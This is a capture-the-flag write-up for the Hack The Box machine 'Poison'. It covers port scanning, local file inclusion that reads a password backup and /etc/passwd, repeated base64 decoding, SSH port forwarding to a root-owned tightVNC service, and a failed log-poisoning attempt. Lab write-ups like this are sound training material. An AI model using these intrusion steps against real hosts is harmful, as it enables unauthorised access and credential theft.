## Default Information
IP Address: 10.10.10.84\
OS: Linux

## Discovery

Before we start, let's first add the IP address and the host to our ```/etc/hosts``` file.

```
10.10.10.84    poison.htb
```
### Masscan
Firstly, we will use masscan to identify the open ports

```
┌──(kali㉿kali)-[~]
└─$ sudo masscan -p1-65535,U:1-65535 10.10.10.84 --rate=1000 -e tun0 
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2021-12-11 02:16:04 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 22/tcp on 10.10.10.84                                     
Discovered open port 80/tcp on 10.10.10.84    
```

### Nmap
We will then use the open ports obtained from masscan to run a scan using nmap to enumerate the services operating behind each port. From the output, we can observe that the likely operating system of the machine is FreeBSD.

| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 22	| SSH | OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0) | Open |
| 80	| HTTP | Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)) | Open |

### Gobuster
We will then use Gobuster to find the endpoints that are accessible from http://swagshop.htb

```
http://10.10.10.84:80/browse.php           
http://10.10.10.84:80/index.php                     
http://10.10.10.84:80/info.php                         
http://10.10.10.84:80/ini.php              
http://10.10.10.84:80/phpinfo.php                    
http://10.10.10.84:80/listfiles.php
```

## Exploit
### Finding list of files
Visiting http://poison.htb, we realize that we are presented with a webpage with a form that allows us to put in the filenames that we want to view. 

![Index page](https://github.com/joelczk/writeups/blob/main/HTB/Images/Poison/index.png)

Inputting ```listfiles.php``` into the form, we are able to view the list of files that we are able to view. From the list of files, we are able to find a pwdbackup.txt file which seems to be the backup file for some of the passwords.

![Password backup file](https://github.com/joelczk/writeups/blob/main/HTB/Images/Poison/password_backup.png)

### Exploiting LFI
In order to view the pwdbackup.txt file, we can exploit the LFI vulnerability on this website by modifying the file parameter on the URL to the pwdbackup.txt

![LFI](https://github.com/joelczk/writeups/blob/main/HTB/Images/Poison/lfi.png)

### Decoding pwdbackup.txt
Looking at http://poison.htb/browse.php?file=pwdbackup.txt, we realize that we are given a base-64 encoded text and we are also told that the base64 encoded text is a password that has been encoded 13 times. So, now all we have to do is to decode the text 13 times to obtain the password.

To decode the text, we will write a simple script to do it. From the output of our script, the decoded password will be ```Charix!2#4%6&8(0```

```
import base64
encoded = "Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU" 
encoded += "bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS" 
encoded += "bVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW"
encoded += "M040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs"
encoded += "WmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy"
encoded += "eG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G"
encoded += "WkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw"
encoded += "MXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa"
encoded += "T1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k"
encoded += "WFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk"
encoded += "WGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0"
encoded += "NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT"
encoded += "Vm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz"
encoded += "WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW"
encoded += "VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO"
encoded += "Ukd4RVdub3dPVU5uUFQwSwo="

count = 0
while (count < 13):
    encoded = base64.b64decode(encoded)
    count += 1
    
print(encoded.decode())
```

### Finding the users

Now that we have the password, we need to find the username that is corresponding to this password. To do that, we just need to make use of the LFI earlier to read the /etc/passwd to find the potential users. From the file, we are able to find that the user would be charix.

![Charix user](https://github.com/joelczk/writeups/blob/main/HTB/Images/Poison/charix.png)

### Obtaining user flag

To obtain the user flag, all we have to do is to ssh using port 22 with the user charix and the password that we have obtained earlier.

```
┌──(kali㉿kali)-[~/Desktop]
└─$ ssh charix@10.10.10.84
(charix@10.10.10.84) Password for charix@Poison:
Last login: Mon Mar 19 16:38:00 2018 from 10.10.14.4
charix@Poison:~ % ls
secret.zip      user.txt
charix@Poison:~ % cat user.txt
<Redacted user flag>
```

### Analyzing secret.zip file

From the /home directory, we find a secret.zip file which we will extract to the local machine for investigation. However, we realize that this zip file is password encrypted but it can be extracted with the password that we obtained earlier.

Unzipping the zip file, we are obtain to obtain a secret file, but we realize that the contents of the secret file are gibberish.

```
┌──(kali㉿kali)-[~/Desktop]
└─$ cat secret                                           
��[|Ֆz!                                                                                                                     
┌──(kali㉿kali)-[~/Desktop]
└─$ file secret
secret: Non-ISO extended-ASCII text, with no line terminators                                                                                                                     
┌──(kali㉿kali)-[~/Desktop]
└─$ xxd secret
00000000: bda8 5b7c d596 7a21                      ..[|..z!
```

### Exploiting tightVNC

Looking at the root processes being executed by the root user, we realize that there is a tightVNC program being executed by the root.

```
root     529  0.0  0.7  23620 7432 v0- I    01:36     0:00.03 Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/cla
```

However, we did not find any ports related to tightVNC during our nmap scan. So, we will use sockstat to find out the port where the tightVNC service is on. From the sockstat output, we find out that the tightVNC service is only available on our local host. Hence, we would need to do port forwarding to make the service available on our local machine.

```
charix@Poison:~ % sockstat -l | grep vnc
root     Xvnc       529   0  stream /tmp/.X11-unix/X1
root     Xvnc       529   1  tcp4   127.0.0.1:5901        *:*
root     Xvnc       529   3  tcp4   127.0.0.1:5801        *:*    
```

Knowing that both ports 5801 and 5901 belong to tightVNC, we will forward both ports our local machine.

```
┌──(kali㉿kali)-[~]
└─$ ssh -L 5801:127.0.0.1:5801 charix@10.10.10.84
┌──(kali㉿kali)-[~]
└─$ ssh -L 5901:127.0.0.1:5901 charix@10.10.10.84
```

Afterwards, we will use nmap to check for the services on the 2 ports on our local machine. 

```
┌──(kali㉿kali)-[~]
└─$ nmap localhost -p5801,5901
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-11 08:31 EST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000093s latency).
Other addresses for localhost (not scanned): ::1

PORT     STATE SERVICE
5801/tcp open  vnc-http-1
5901/tcp open  vnc-1

Nmap done: 1 IP address (1 host up) scanned in 0.21 seconds
```

### Obtaining root flag
To obtain the root flag, we will have to connect to tightVNC using the secret file that we have obtained earlier. However, we realize that we are unable to connect to the vnc service that is on port 5801. This leaves us with port 5901 that we can connect to. Fortunately, we are able to successufully connect to the vnc service on port 5901 using vncviewer.

```
┌──(kali㉿kali)-[~/Desktop]
└─$ vncviewer 127.0.0.1:5901 -passwd secret
Connected to RFB server, using protocol version 3.8
Enabling TightVNC protocol extensions
Performing standard VNC authentication
Authentication successful
Desktop name "root's X desktop (Poison:1)"
VNC server default format:
  32 bits per pixel.
  Least significant byte first in each pixel.
  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
Using default colormap which is TrueColor.  Pixel format:
  32 bits per pixel.
  Least significant byte first in each pixel.
  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
Same machine: preferring raw encoding
```

Successful connection to the vncviewer on port 5901 will then give us a graphical interface of the TightVNC interface where we can put in terminal commands. From there, we are then able to obtain our root flag.

![Root password](https://github.com/joelczk/writeups/blob/main/HTB/Images/Poison/tightvnc.png)

## Post-Exploitation
### Log-Poisoning

To do log poisoning, we need to find the location of the access.log file. For OpenBSD, the access.log file is located at /var/log/access.log

```
charix@Poison:/var/log % locate access.log
/var/log/httpd-access.log
```

However, we did not manage to get access to the /var/log/httpd-access.log file due to some error, most likely due to the fact that there are too many log enteries being generated from the use of Gobuster earlier on.

![Log Poisoning](https://github.com/joelczk/writeups/blob/main/HTB/Images/Poison/log_poisoning.png)

```
charix@Poison:/var/log % wc -l httpd-access.log
 1021311 httpd-access.log
```
